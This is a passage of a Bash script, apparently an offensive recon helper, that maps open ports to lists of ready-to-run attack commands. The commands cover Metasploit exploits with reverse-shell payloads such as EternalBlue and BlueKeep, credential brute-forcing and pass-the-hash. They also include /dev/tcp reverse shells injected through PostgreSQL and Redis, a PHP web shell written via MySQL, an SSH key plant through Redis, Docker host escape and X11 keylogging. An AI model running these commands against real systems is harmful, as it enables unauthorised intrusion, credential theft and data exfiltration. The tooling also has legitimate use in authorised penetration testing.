        suggestions+=("  ${BOLD}[SSL/TLS audit]${RESET}")
        suggestions+=("    sslscan $ip:$port | tee $OUTDIR/ssl/sslscan_${ip}_${port}.txt")
        suggestions+=("    testssl.sh $ip:$port | tee $OUTDIR/ssl/testssl_${ip}_${port}.txt")
        suggestions+=("    use auxiliary/scanner/ssl/ssl_version        | set RHOSTS $ip | set RPORT $port | run")

        if echo "$script_out" | grep -qi "HEARTBLEED\|heartbleed\|CVE-2014-0160"; then
            suggestions+=("  ${LRED}${BOLD}*** CRITICAL: OpenSSL Heartbleed (CVE-2014-0160) ***${RESET}")
            suggestions+=("    use auxiliary/scanner/ssl/openssl_heartbleed | set RHOSTS $ip | set RPORT $port | set VERBOSE true | run")
            suggestions+=("    python heartbleed-poc.py $ip -p $port")
            severity_add "$ip" "CRITICAL" "Heartbleed CVE-2014-0160 port $port"
        fi
        if echo "$script_out" | grep -qi "POODLE\|CVE-2014-3566"; then
            suggestions+=("  ${LRED}${BOLD}*** HIGH: POODLE (CVE-2014-3566) ***${RESET}")
            suggestions+=("    use auxiliary/scanner/ssl/openssl_ccs       | set RHOSTS $ip | set RPORT $port | run")
            severity_add "$ip" "HIGH" "POODLE CVE-2014-3566 port $port"
        fi
        if echo "$script_out" | grep -qi "DROWN\|CVE-2016-0800"; then
            suggestions+=("  ${LRED}${BOLD}*** CRITICAL: DROWN (CVE-2016-0800) ***${RESET}")
            severity_add "$ip" "CRITICAL" "DROWN CVE-2016-0800 port $port"
        fi
        if echo "$script_out" | grep -qi "CRIME\|CVE-2012-4929"; then
            suggestions+=("  ${LRED}${BOLD}*** HIGH: CRIME (CVE-2012-4929) ***${RESET}")
            severity_add "$ip" "HIGH" "CRIME CVE-2012-4929 port $port"
        fi
        ;;

    ##########################################################################
    139|445) # SMB
    ##########################################################################
        suggestions+=("${LCYAN}── SMB :$port ────────────────────────────────────────────${RESET}")
        severity_add "$ip" "HIGH" "SMB on $port"

        suggestions+=("  ${BOLD}[Enumeration]${RESET}")
        suggestions+=("    smbclient -L //$ip -N")
        suggestions+=("    smbmap -H $ip")
        suggestions+=("    enum4linux -a $ip | tee $OUTDIR/loot/enum4linux_${ip}.txt")
        suggestions+=("    crackmapexec smb $ip --shares")
        suggestions+=("    nmap --script=smb-enum-shares,smb-enum-users,smb-os-discovery,smb-security-mode,smb-vuln* -p 139,445 $ip")
        suggestions+=("    rpcclient -U '' -N $ip -c 'enumdomusers;enumdomgroups'")
        suggestions+=("    impacket-lookupsid anonymous@$ip")

        suggestions+=("  ${BOLD}[Brute-force / credential attacks]${RESET}")
        suggestions+=("    crackmapexec smb $ip -u $WORDLIST_USERS -p $WORDLIST_PASS --continue-on-success")
        suggestions+=("    hydra -L $WORDLIST_USERS -P $WORDLIST_PASS smb://$ip")
        suggestions+=("    use auxiliary/scanner/smb/smb_login           | set RHOSTS $ip | set USER_FILE $WORDLIST_USERS | set PASS_FILE $WORDLIST_PASS | run")

        suggestions+=("  ${BOLD}[Relay / pass-the-hash]${RESET}")
        suggestions+=("    impacket-ntlmrelayx -tf targets.txt -smb2support")
        suggestions+=("    crackmapexec smb $ip -u administrator -H <NTLM_HASH>   # PTH")
        suggestions+=("    impacket-psexec administrator:password@$ip")
        suggestions+=("    impacket-wmiexec administrator:password@$ip")
        suggestions+=("    impacket-smbexec administrator:password@$ip")

        suggestions+=("  ${BOLD}[Metasploit]${RESET}")
        suggestions+=("    use auxiliary/scanner/smb/smb_version         | set RHOSTS $ip | run")
        suggestions+=("    use auxiliary/scanner/smb/smb_enumshares      | set RHOSTS $ip | run")
        suggestions+=("    use auxiliary/scanner/smb/smb_enumusers       | set RHOSTS $ip | run")
        suggestions+=("    use auxiliary/scanner/smb/smb_ms17_010        | set RHOSTS $ip | run  # check only")

        # EternalBlue
        if echo "$script_out" | grep -qi "ms17-010\|eternalblue\|VULNERABLE"; then
            suggestions+=("  ${LRED}${BOLD}*** CRITICAL: EternalBlue MS17-010 (CVE-2017-0144) CONFIRMED ***${RESET}")
            suggestions+=("    use exploit/windows/smb/ms17_010_eternalblue  | set RHOSTS $ip | set LHOST $lh | set LPORT $LPORT | set PAYLOAD windows/x64/meterpreter/reverse_tcp | run")
            suggestions+=("    use exploit/windows/smb/ms17_010_psexec       | set RHOSTS $ip | set LHOST $lh | set LPORT $LPORT | run")
            suggestions+=("    python3 zzz_exploit.py $ip                     # AutoBlue")
            severity_add "$ip" "CRITICAL" "EternalBlue MS17-010 confirmed port $port"
            CONFIRMED_VULNS+=("${ip}:${port}:MS17-010")
            [[ $POST_EXPLOIT_HINTS -eq 1 ]] && POSTEXPLOIT_MAP["$ip"]="${POSTEXPLOIT_DB[meterpreter]}"
        fi
        # MS08-067
        if echo "$script_out" | grep -qi "ms08-067\|CVE-2008-4250"; then
            suggestions+=("  ${LRED}${BOLD}*** CRITICAL: MS08-067 NetAPI (CVE-2008-4250) ***${RESET}")
            suggestions+=("    use exploit/windows/smb/ms08_067_netapi       | set RHOSTS $ip | set LHOST $lh | set LPORT $LPORT | run")
            severity_add "$ip" "CRITICAL" "MS08-067 CVE-2008-4250 port $port"
        fi
        # PrintNightmare
        if echo "$script_out" | grep -qi "PrintNightmare\|CVE-2021-1675\|CVE-2021-34527"; then
            suggestions+=("  ${LRED}${BOLD}*** CRITICAL: PrintNightmare (CVE-2021-34527) ***${RESET}")
            suggestions+=("    use exploit/windows/dcerpc/cve_2021_1675_printnightmare | set RHOSTS $ip | set LHOST $lh | set LPORT $LPORT | run")
            suggestions+=("    impacket-rpcdump $ip | grep -i 'spoolss'")
            severity_add "$ip" "CRITICAL" "PrintNightmare CVE-2021-34527 $ip"
        fi
        # SambaCry
        if echo "$script_out" | grep -qi "SambaCry\|CVE-2017-7494"; then
            suggestions+=("  ${LRED}${BOLD}*** CRITICAL: SambaCry (CVE-2017-7494) ***${RESET}")
            suggestions+=("    use exploit/linux/samba/is_known_pipename      | set RHOSTS $ip | set LHOST $lh | set LPORT $LPORT | run")
            severity_add "$ip" "CRITICAL" "SambaCry CVE-2017-7494 port $port"
        fi
        ;;

    ##########################################################################
    3389) # RDP
    ##########################################################################
        suggestions+=("${LCYAN}── RDP :$port ────────────────────────────────────────────${RESET}")
        severity_add "$ip" "HIGH" "RDP on $port"
        suggestions+=("  ${BOLD}[Brute-force]${RESET}")
        suggestions+=("    hydra -L $WORDLIST_USERS -P $WORDLIST_PASS rdp://$ip -t 4 -s $port")
        suggestions+=("    crowbar -b rdp -s ${ip}/32 -U $WORDLIST_USERS -C $WORDLIST_PASS")
        suggestions+=("    crackmapexec rdp $ip -u $WORDLIST_USERS -p $WORDLIST_PASS")
        suggestions+=("  ${BOLD}[Connection]${RESET}")
        suggestions+=("    xfreerdp /v:$ip /u:administrator /p:password /cert-ignore +clipboard /dynamic-resolution")
        suggestions+=("    rdesktop $ip:$port -u administrator -p password")
        suggestions+=("  ${BOLD}[Metasploit]${RESET}")
        suggestions+=("    use auxiliary/scanner/rdp/rdp_scanner          | set RHOSTS $ip | run")
        suggestions+=("    use auxiliary/scanner/rdp/ms12_020_check       | set RHOSTS $ip | run")

        if echo "$script_out" | grep -qi "CVE-2019-0708\|BlueKeep"; then
            suggestions+=("  ${LRED}${BOLD}*** CRITICAL: BlueKeep (CVE-2019-0708) ***${RESET}")
            suggestions+=("    use auxiliary/scanner/rdp/cve_2019_0708_bluekeep           | set RHOSTS $ip | run  # check")
            suggestions+=("    use exploit/windows/rdp/cve_2019_0708_bluekeep_rce         | set RHOSTS $ip | set LHOST $lh | set LPORT $LPORT | set TARGET 2 | run")
            severity_add "$ip" "CRITICAL" "BlueKeep CVE-2019-0708 port $port"
        fi
        if echo "$script_out" | grep -qi "CVE-2019-1182\|DejaBlue"; then
            suggestions+=("  ${LRED}${BOLD}*** CRITICAL: DejaBlue (CVE-2019-1182) ***${RESET}")
            severity_add "$ip" "CRITICAL" "DejaBlue CVE-2019-1182 port $port"
        fi
        if echo "$script_out" | grep -qi "ms12-020\|CVE-2012-0152"; then
            suggestions+=("  ${BOLD}*** HIGH: MS12-020 RDP DoS ***${RESET}")
            suggestions+=("    use auxiliary/dos/windows/rdp/ms12_020_maxchannelids | set RHOSTS $ip | run")
            severity_add "$ip" "HIGH" "MS12-020 port $port"
        fi
        ;;

    ##########################################################################
    3306) # MySQL
    ##########################################################################
        suggestions+=("${LCYAN}── MySQL :$port ──────────────────────────────────────────${RESET}")
        severity_add "$ip" "HIGH" "MySQL exposed on $port"
        suggestions+=("  ${BOLD}[Access]${RESET}")
        suggestions+=("    mysql -h $ip -P $port -u root -p")
        suggestions+=("    mysql -h $ip -P $port -u root --password=''   # blank password")
        suggestions+=("  ${BOLD}[Brute-force]${RESET}")
        suggestions+=("    hydra -L $WORDLIST_USERS -P $WORDLIST_PASS -t $THREADS mysql://$ip:$port")
        suggestions+=("    use auxiliary/scanner/mysql/mysql_login       | set RHOSTS $ip | set USERNAME root | set BLANK_PASSWORDS true | run")
        suggestions+=("  ${BOLD}[Post-access exploitation]${RESET}")
        suggestions+=("    use auxiliary/scanner/mysql/mysql_hashdump    | set RHOSTS $ip | run")
        suggestions+=("    use auxiliary/admin/mysql/mysql_enum          | set RHOSTS $ip | run")
        suggestions+=("    use auxiliary/admin/mysql/mysql_sql           | set RHOSTS $ip | set SQL 'select user,password from mysql.user' | run")
        suggestions+=("    use auxiliary/admin/mysql/mysql_sql           | set RHOSTS $ip | set SQL 'select load_file(\"/etc/passwd\")' | run")
        suggestions+=("    use exploit/multi/mysql/mysql_udf_payload     | set RHOSTS $ip | set LHOST $lh | set LPORT $LPORT | run  # UDF RCE")
        suggestions+=("  ${BOLD}[Manual UDF RCE]${RESET}")
        suggestions+=("    # SELECT '<?php system(\$_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/html/shell.php'")
        ;;

    ##########################################################################
    5432) # PostgreSQL
    ##########################################################################
        suggestions+=("${LCYAN}── PostgreSQL :$port ──────────────────────────────────────${RESET}")
        severity_add "$ip" "HIGH" "PostgreSQL exposed on $port"
        suggestions+=("  ${BOLD}[Access]${RESET}")
        suggestions+=("    psql -h $ip -p $port -U postgres")
        suggestions+=("  ${BOLD}[Brute-force]${RESET}")
        suggestions+=("    hydra -L $WORDLIST_USERS -P $WORDLIST_PASS -t $THREADS postgres://$ip:$port")
        suggestions+=("    use auxiliary/scanner/postgres/postgres_login | set RHOSTS $ip | run")
        suggestions+=("  ${BOLD}[Post-access]${RESET}")
        suggestions+=("    use auxiliary/scanner/postgres/postgres_hashdump | set RHOSTS $ip | run")
        suggestions+=("    use exploit/multi/postgres/postgres_copy_from_program_cmd_exec | set RHOSTS $ip | set LHOST $lh | set LPORT $LPORT | run")
        suggestions+=("    # COPY cmd TO PROGRAM 'bash -c \"bash -i >& /dev/tcp/$lh/$LPORT 0>&1\"'")
        ;;

    ##########################################################################
    1433) # MSSQL
    ##########################################################################
        suggestions+=("${LCYAN}── MSSQL :$port ──────────────────────────────────────────${RESET}")
        severity_add "$ip" "HIGH" "MSSQL exposed on $port"
        suggestions+=("  ${BOLD}[Access]${RESET}")
        suggestions+=("    impacket-mssqlclient sa:password@$ip:$port")
        suggestions+=("    sqsh -S $ip:$port -U sa -P password")
        suggestions+=("  ${BOLD}[Brute-force]${RESET}")
        suggestions+=("    hydra -L $WORDLIST_USERS -P $WORDLIST_PASS -t $THREADS mssql://$ip:$port")
        suggestions+=("    use auxiliary/scanner/mssql/mssql_login       | set RHOSTS $ip | run")
        suggestions+=("  ${BOLD}[Post-access / xp_cmdshell]${RESET}")
        suggestions+=("    use auxiliary/admin/mssql/mssql_exec          | set RHOSTS $ip | set CMD 'whoami' | run")
        suggestions+=("    use auxiliary/admin/mssql/mssql_enum          | set RHOSTS $ip | run")
        suggestions+=("    use exploit/windows/mssql/mssql_payload       | set RHOSTS $ip | set LHOST $lh | set LPORT $LPORT | run")
        suggestions+=("    # EXEC xp_cmdshell 'powershell -e <BASE64_PAYLOAD>'")
        ;;

    ##########################################################################
    1521) # Oracle
    ##########################################################################
        suggestions+=("${LCYAN}── Oracle DB :$port ───────────────────────────────────────${RESET}")
        severity_add "$ip" "HIGH" "Oracle DB on $port"
        suggestions+=("  ${BOLD}[SID enumeration]${RESET}")
        suggestions+=("    use auxiliary/scanner/oracle/sid_enum         | set RHOSTS $ip | run")
        suggestions+=("    use auxiliary/scanner/oracle/sid_brute        | set RHOSTS $ip | run")
        suggestions+=("    tnscmd10g version -h $ip -p $port")
        suggestions+=("  ${BOLD}[Login]${RESET}")
        suggestions+=("    use auxiliary/scanner/oracle/oracle_login     | set RHOSTS $ip | run")
        suggestions+=("    use auxiliary/scanner/oracle/oracle_hashdump  | set RHOSTS $ip | run")
        suggestions+=("  ${BOLD}[Java RCE]${RESET}")
        suggestions+=("    use exploit/multi/oracle/java_stored_procedure | set RHOSTS $ip | set LHOST $lh | set LPORT $LPORT | run")
        ;;

    ##########################################################################
    6379) # Redis
    ##########################################################################
        suggestions+=("${LCYAN}── Redis :$port ──────────────────────────────────────────${RESET}")
        severity_add "$ip" "CRITICAL" "Redis exposed on $port"
        suggestions+=("  ${BOLD}[Unauthenticated check]${RESET}")
        suggestions+=("    redis-cli -h $ip -p $port ping")
        suggestions+=("    redis-cli -h $ip -p $port info server")
        suggestions+=("    redis-cli -h $ip -p $port config get *")
        suggestions+=("  ${BOLD}[Data dump]${RESET}")
        suggestions+=("    redis-cli -h $ip -p $port keys '*'")
        suggestions+=("    redis-cli -h $ip -p $port --scan --pattern '*' | xargs -I{} redis-cli -h $ip GET {}")
        suggestions+=("  ${BOLD}[RCE via crontab]${RESET}")
        suggestions+=("    redis-cli -h $ip -p $port config set dir /var/spool/cron/crontabs")
        suggestions+=("    redis-cli -h $ip -p $port config set dbfilename root")
        suggestions+=("    redis-cli -h $ip -p $port set cronpwn '\\n\\n* * * * * bash -i >& /dev/tcp/$lh/$LPORT 0>&1\\n\\n'")
        suggestions+=("    redis-cli -h $ip -p $port save")
        suggestions+=("  ${BOLD}[RCE via SSH authorized_keys]${RESET}")
        suggestions+=("    ssh-keygen -t rsa -f /tmp/redis_key -N ''")
        suggestions+=("    echo -e '\\n\\n' > /tmp/redis_pub && cat /tmp/redis_key.pub >> /tmp/redis_pub && echo -e '\\n\\n' >> /tmp/redis_pub")
        suggestions+=("    redis-cli -h $ip -p $port config set dir /root/.ssh")
        suggestions+=("    redis-cli -h $ip -p $port config set dbfilename authorized_keys")
        suggestions+=("    redis-cli -h $ip -p $port set key \"\$(cat /tmp/redis_pub)\"")
        suggestions+=("    redis-cli -h $ip -p $port save")
        suggestions+=("    ssh -i /tmp/redis_key root@$ip")
        suggestions+=("  ${BOLD}[Metasploit]${RESET}")
        suggestions+=("    use auxiliary/scanner/redis/redis_server      | set RHOSTS $ip | set RPORT $port | run")
        ;;

    ##########################################################################
    9200|9300) # Elasticsearch
    ##########################################################################
        suggestions+=("${LCYAN}── Elasticsearch :$port ──────────────────────────────────${RESET}")
        severity_add "$ip" "CRITICAL" "Elasticsearch exposed on $port"
        suggestions+=("  ${BOLD}[Unauthenticated dump]${RESET}")
        suggestions+=("    curl -s http://$ip:$port/")
        suggestions+=("    curl -s http://$ip:$port/_cat/indices?v")
        suggestions+=("    curl -s 'http://$ip:$port/_search?size=10000&pretty'")
        suggestions+=("    curl -s http://$ip:$port/_nodes?pretty")
        suggestions+=("    curl -s 'http://$ip:$port/*/_search?q=*:*&size=10&pretty'")
        suggestions+=("  ${BOLD}[Metasploit]${RESET}")
        suggestions+=("    use auxiliary/scanner/elasticsearch/indices_enum | set RHOSTS $ip | set RPORT $port | run")
        ;;

    ##########################################################################
    27017|27018|27019) # MongoDB
    ##########################################################################
        suggestions+=("${LCYAN}── MongoDB :$port ────────────────────────────────────────${RESET}")
        severity_add "$ip" "CRITICAL" "MongoDB exposed on $port"
        suggestions+=("  ${BOLD}[Unauthenticated check]${RESET}")
        suggestions+=("    mongosh $ip:$port --eval 'db.adminCommand({listDatabases:1})'")
        suggestions+=("    mongo $ip:$port --eval 'db.adminCommand({listDatabases:1})'")
        suggestions+=("  ${BOLD}[Dump data]${RESET}")
        suggestions+=("    mongodump --host $ip --port $port --out $OUTDIR/loot/mongodump_${ip}")
        suggestions+=("  ${BOLD}[Metasploit]${RESET}")
        suggestions+=("    use auxiliary/scanner/mongodb/mongodb_login   | set RHOSTS $ip | run")
        suggestions+=("    use auxiliary/gather/mongodb_js_inject_collection_enum | set RHOSTS $ip | run")
        ;;

    ##########################################################################
    161|162) # SNMP
    ##########################################################################
        suggestions+=("${LCYAN}── SNMP :${port}/UDP ──────────────────────────────────────${RESET}")
        severity_add "$ip" "MEDIUM" "SNMP on $port"
        suggestions+=("  ${BOLD}[Community string brute]${RESET}")
        suggestions+=("    onesixtyone -c /usr/share/doc/onesixtyone/dict.txt $ip")
        suggestions+=("    hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt snmp://$ip")
        suggestions+=("  ${BOLD}[Walk / info dump]${RESET}")
        suggestions+=("    snmpwalk -v1  -c public $ip | tee $OUTDIR/loot/snmpwalk_v1_${ip}.txt")
        suggestions+=("    snmpwalk -v2c -c public $ip | tee $OUTDIR/loot/snmpwalk_v2c_${ip}.txt")
        suggestions+=("    snmp-check $ip -c public")
        suggestions+=("    nmap --script=snmp-info,snmp-interfaces,snmp-processes,snmp-sysdescr -p U:161 $ip")
        suggestions+=("  ${BOLD}[Metasploit]${RESET}")
        suggestions+=("    use auxiliary/scanner/snmp/snmp_enum          | set RHOSTS $ip | run")
        suggestions+=("    use auxiliary/scanner/snmp/snmp_enumusers     | set RHOSTS $ip | run")
        suggestions+=("    use auxiliary/scanner/snmp/snmp_login         | set RHOSTS $ip | run")
        ;;

    ##########################################################################
    2049) # NFS
    ##########################################################################
        suggestions+=("${LCYAN}── NFS :$port ────────────────────────────────────────────${RESET}")
        severity_add "$ip" "HIGH" "NFS exposed on $port"
        suggestions+=("  ${BOLD}[Enumerate]${RESET}")
        suggestions+=("    showmount -e $ip")
        suggestions+=("    nmap --script=nfs-showmount,nfs-ls,nfs-statfs -p 111,2049 $ip")
        suggestions+=("  ${BOLD}[Mount]${RESET}")
        suggestions+=("    mkdir /mnt/nfs_${ip} && mount -t nfs -o nolock $ip:/ /mnt/nfs_${ip}")
        suggestions+=("    mount -t nfs $ip:/export /mnt/nfs_${ip}")
        suggestions+=("  ${BOLD}[Privilege escalation via NFS no_root_squash]${RESET}")
        suggestions+=("    # If no_root_squash: copy /bin/bash to NFS share → chmod u+s → execute as local root")
        suggestions+=("    cp /bin/bash /mnt/nfs_${ip}/bash && chmod u+s /mnt/nfs_${ip}/bash")
        suggestions+=("  ${BOLD}[Metasploit]${RESET}")
        suggestions+=("    use auxiliary/scanner/nfs/nfsmount             | set RHOSTS $ip | run")
        ;;

    ##########################################################################
    5900|5901|5902) # VNC
    ##########################################################################
        suggestions+=("${LCYAN}── VNC :$port ────────────────────────────────────────────${RESET}")
        severity_add "$ip" "HIGH" "VNC on $port"
        suggestions+=("  ${BOLD}[No-auth check]${RESET}")
        suggestions+=("    use auxiliary/scanner/vnc/vnc_none_auth        | set RHOSTS $ip | set RPORT $port | run")
        suggestions+=("    nmap --script=vnc-info,vnc-brute -p $port $ip")
        suggestions+=("  ${BOLD}[Brute-force]${RESET}")
        suggestions+=("    hydra -P $WORDLIST_PASS vnc://$ip:$port -t 4")
        suggestions+=("    use auxiliary/scanner/vnc/vnc_login            | set RHOSTS $ip | set RPORT $port | run")
        suggestions+=("  ${BOLD}[Connect]${RESET}")
        suggestions+=("    vncviewer $ip:$port")
        suggestions+=("    xvnc4viewer $ip:$((port - 5900))")
        ;;

    ##########################################################################
    5985|5986) # WinRM
    ##########################################################################
        suggestions+=("${LCYAN}── WinRM :$port ──────────────────────────────────────────${RESET}")
        severity_add "$ip" "HIGH" "WinRM on $port"
        suggestions+=("  ${BOLD}[Brute-force]${RESET}")
        suggestions+=("    crackmapexec winrm $ip -u $WORDLIST_USERS -p $WORDLIST_PASS")
        suggestions+=("    use auxiliary/scanner/winrm/winrm_login        | set RHOSTS $ip | set RPORT $port | set USER_FILE $WORDLIST_USERS | set PASS_FILE $WORDLIST_PASS | run")
        suggestions+=("  ${BOLD}[Shell]${RESET}")
        suggestions+=("    evil-winrm -i $ip -u administrator -p password")
        suggestions+=("    evil-winrm -i $ip -u administrator -H <NTLM_HASH>   # PTH")
        suggestions+=("    use exploit/windows/winrm/winrm_script_exec    | set RHOSTS $ip | set RPORT $port | set LHOST $lh | set LPORT $LPORT | run")
        ;;

    ##########################################################################
    6000|6001) # X11
    ##########################################################################
        suggestions+=("${LCYAN}── X11 :$port ────────────────────────────────────────────${RESET}")
        severity_add "$ip" "CRITICAL" "X11 open on $port"
        suggestions+=("  ${BOLD}[No-auth check / screenshot]${RESET}")
        suggestions+=("    nmap --script=x11-access -p $port $ip")
        suggestions+=("    xwd -root -screen -silent -display $ip:0 -out $OUTDIR/screenshots/${ip}_x11.xwd && convert $OUTDIR/screenshots/${ip}_x11.xwd $OUTDIR/screenshots/${ip}_x11.png")
        suggestions+=("    DISPLAY=$ip:0 xterm &")
        suggestions+=("  ${BOLD}[Keylogging]${RESET}")
        suggestions+=("    DISPLAY=$ip:0 xspy &")
        suggestions+=("  ${BOLD}[Metasploit]${RESET}")
        suggestions+=("    use exploit/unix/x11/x11_keyboard_exec         | set RHOSTS $ip | set LHOST $lh | set LPORT $LPORT | run")
        ;;

    ##########################################################################
    8080|8443|8009) # Tomcat
    ##########################################################################
        if [[ "$svc_lower" == *"tomcat"* || "$svc_lower" == *"apache-coyote"* || "$svc_lower" == *"jserv"* ]]; then
            suggestions+=("${LCYAN}── Apache Tomcat :$port ──────────────────────────────────${RESET}")
            severity_add "$ip" "HIGH" "Apache Tomcat on $port"
            suggestions+=("  ${BOLD}[Default creds / manager]${RESET}")
            suggestions+=("    use auxiliary/scanner/http/tomcat_mgr_login   | set RHOSTS $ip | set RPORT $port | run")
            suggestions+=("    curl -u tomcat:tomcat http://$ip:$port/manager/html")
            suggestions+=("  ${BOLD}[WAR deploy / RCE]${RESET}")
            suggestions+=("    msfvenom -p java/jsp_shell_reverse_tcp LHOST=$lh LPORT=$LPORT -f war -o $OUTDIR/payloads/shell_${ip}.war")
            suggestions+=("    use exploit/multi/http/tomcat_mgr_upload      | set RHOSTS $ip | set RPORT $port | set LHOST $lh | set LPORT $LPORT | run")
            suggestions+=("    use exploit/multi/http/tomcat_jsp_upload_bypass| set RHOSTS $ip | set RPORT $port | set LHOST $lh | set LPORT $LPORT | run")
            if [[ "$port" == "8009" ]]; then
                suggestions+=("  ${LRED}${BOLD}*** CRITICAL: AJP Ghostcat (CVE-2020-1938) on port 8009 ***${RESET}")
                suggestions+=("    use auxiliary/gather/tomcat_ghostcat        | set RHOSTS $ip | set RPORT 8009 | run")
                suggestions+=("    python3 ghostcat.py -a $ip -p 8009 -f /WEB-INF/web.xml")
                severity_add "$ip" "CRITICAL" "Ghostcat CVE-2020-1938 port 8009"
            fi
        fi
        ;;

    ##########################################################################
    2375|2376) # Docker
    ##########################################################################
        suggestions+=("${LCYAN}── Docker API :$port ─────────────────────────────────────${RESET}")
        severity_add "$ip" "CRITICAL" "Docker daemon exposed on $port"
        suggestions+=("  ${BOLD}[Enumerate]${RESET}")
        suggestions+=("    curl -s http://$ip:$port/containers/json | python3 -m json.tool")
        suggestions+=("    curl -s http://$ip:$port/images/json     | python3 -m json.tool")
        suggestions+=("    curl -s http://$ip:$port/info            | python3 -m json.tool")
        suggestions+=("  ${BOLD}[Host escape / RCE]${RESET}")
        suggestions+=("    docker -H $ip:$port run --rm -v /:/mnt -it alpine chroot /mnt sh")
        suggestions+=("    docker -H $ip:$port run --rm --privileged -v /:/host alpine chroot /host sh")
        suggestions+=("  ${BOLD}[Metasploit]${RESET}")
        suggestions+=("    use exploit/linux/http/docker_daemon_tcp       | set RHOSTS $ip | set RPORT $port | set LHOST $lh | set LPORT $LPORT | run")
        ;;

    ##########################################################################
    10000) # Webmin
    ##########################################################################
        suggestions+=("${LCYAN}── Webmin :$port ─────────────────────────────────────────${RESET}")
        severity_add "$ip" "CRITICAL" "Webmin on $port"
        suggestions+=("  ${BOLD}[RCE exploits]${RESET}")
        suggestions+=("    use exploit/unix/webapp/webmin_show_cgi_exec   | set RHOSTS $ip | set RPORT $port | set LHOST $lh | set LPORT $LPORT | run")
        suggestions+=("    use exploit/linux/http/webmin_backdoor         | set RHOSTS $ip | set RPORT $port | set LHOST $lh | set LPORT $LPORT | run  # CVE-2019-15107")
        suggestions+=("    use exploit/linux/http/webmin_upload_exec      | set RHOSTS $ip | set RPORT $port | set LHOST $lh | set LPORT $LPORT | run")
        ;;

    ##########################################################################
    8161|61616) # ActiveMQ
    ##########################################################################
        suggestions+=("${LCYAN}── ActiveMQ :$port ───────────────────────────────────────${RESET}")
        severity_add "$ip" "CRITICAL" "ActiveMQ on $port"
        suggestions+=("  ${BOLD}[CVE-2023-46604 RCE]${RESET}")
        suggestions+=("    use exploit/multi/misc/apache_activemq_rce_cve_2023_46604 | set RHOSTS $ip | set RPORT 61616 | set LHOST $lh | set LPORT $LPORT | run")
        suggestions+=("    python3 exploit-CVE-2023-46604.py -i $ip -p 61616 -u 'http://$lh/poc.xml'")
        suggestions+=("  ${BOLD}[Web console (port 8161)]${RESET}")
        suggestions+=("    curl -u admin:admin http://$ip:8161/admin/")
        suggestions+=("  ${BOLD}[Brute-force console]${RESET}")
        suggestions+=("    hydra -L $WORDLIST_USERS -P $WORDLIST_PASS http-get://$ip:8161/admin/")
        ;;

    ##########################################################################
    11211) # Memcached
    ##########################################################################
        suggestions+=("${LCYAN}── Memcached :$port ──────────────────────────────────────${RESET}")
        severity_add "$ip" "CRITICAL" "Memcached exposed on $port"
        suggestions+=("  ${BOLD}[Data dump]${RESET}")
        suggestions+=("    echo 'stats items' | nc -q1 $ip $port")
        suggestions+=("    echo 'stats cachedump 1 100' | nc -q1 $ip $port")
        suggestions+=("    use auxiliary/gather/memcache_extractor        | set RHOSTS $ip | run")
        ;;

    ##########################################################################
    2181) # ZooKeeper
    ##########################################################################
        suggestions+=("${LCYAN}── ZooKeeper :$port ──────────────────────────────────────${RESET}")
        severity_add "$ip" "HIGH" "ZooKeeper on $port"
        suggestions+=("  ${BOLD}[Unauthenticated check]${RESET}")
        suggestions+=("    echo 'ruok' | nc $ip $port")
        suggestions+=("    echo 'dump' | nc $ip $port")
        suggestions+=("    echo 'stat' | nc $ip $port")
        suggestions+=("    zkCli.sh -server $ip:$port  # if installed")
        ;;

    ##########################################################################
    4848) # GlassFish
    ##########################################################################
        suggestions+=("${LCYAN}── GlassFish :$port ──────────────────────────────────────${RESET}")
        severity_add "$ip" "HIGH" "GlassFish on $port"
        suggestions+=("    curl -sk https://$ip:$port/management/domain/")
        suggestions+=("    use auxiliary/scanner/http/glassfish_traversal | set RHOSTS $ip | run")
        suggestions+=("    # Default: admin / adminadmin at https://$ip:4848/")
        ;;

    ##########################################################################
    389|636) # LDAP
    ##########################################################################
        suggestions+=("${LCYAN}── LDAP :$port ───────────────────────────────────────────${RESET}")
        severity_add "$ip" "MEDIUM" "LDAP on $port"
        suggestions+=("  ${BOLD}[Anonymous bind / enum]${RESET}")
        suggestions+=("    ldapsearch -x -H ldap://$ip -b '' -s base '(objectClass=*)' 2>/dev/null | head -30")
        suggestions+=("    ldapsearch -x -H ldap://$ip -b 'dc=domain,dc=com' '(objectClass=user)' sAMAccountName")
        suggestions+=("    nmap --script=ldap-search,ldap-rootdse -p $port $ip")
        suggestions+=("  ${BOLD}[Brute-force]${RESET}")
        suggestions+=("    use auxiliary/scanner/ldap/ldap_login          | set RHOSTS $ip | set RPORT $port | run")
        suggestions+=("  ${BOLD}[AD / Kerberos]${RESET}")
        suggestions+=("    kerbrute userenum --dc $ip -d DOMAIN $WORDLIST_USERS")
        suggestions+=("    impacket-GetNPUsers DOMAIN/ -dc-ip $ip -usersfile $WORDLIST_USERS -no-pass  # AS-REP roast")
        ;;

    ##########################################################################
    88) # Kerberos
    ##########################################################################
        suggestions+=("${LCYAN}── Kerberos :$port ───────────────────────────────────────${RESET}")
        severity_add "$ip" "HIGH" "Kerberos on $port — likely Domain Controller"
        suggestions+=("  ${BOLD}[User enumeration]${RESET}")
        suggestions+=("    kerbrute userenum --dc $ip -d DOMAIN $WORDLIST_USERS -o $OUTDIR/loot/kerbrute_${ip}.txt")
        suggestions+=("  ${BOLD}[AS-REP Roasting]${RESET}")
        suggestions+=("    impacket-GetNPUsers DOMAIN/ -dc-ip $ip -usersfile $WORDLIST_USERS -no-pass -outputfile $OUTDIR/loot/asrep_hashes.txt")
        suggestions+=("    hashcat -m 18200 $OUTDIR/loot/asrep_hashes.txt $WORDLIST_PASS")
        suggestions+=("  ${BOLD}[Kerberoasting]${RESET}")
        suggestions+=("    impacket-GetUserSPNs DOMAIN/user:password -dc-ip $ip -outputfile $OUTDIR/loot/kerb_hashes.txt")
        suggestions+=("    hashcat -m 13100 $OUTDIR/loot/kerb_hashes.txt $WORDLIST_PASS")
        suggestions+=("  ${BOLD}[Misc]${RESET}")
        suggestions+=("    nmap --script=krb5-enum-users --script-args='krb5-enum-users.realm=DOMAIN' -p $port $ip")
        ;;

    ##########################################################################
    *) # Unknown / generic
    ##########################################################################
        if [[ -n "$service" && "$service" != "unknown" ]]; then
            suggestions+=("${LCYAN}── $service :$port ─────────────────────────────────────────${RESET}")
            suggestions+=("    searchsploit '$product $version'")
            suggestions+=("    searchsploit '$service'")
            suggestions+=("    search type:exploit name:$service  # in msfconsole")
            suggestions+=("    hydra -L $WORDLIST_USERS -P $WORDLIST_PASS -s $port $ip $service")
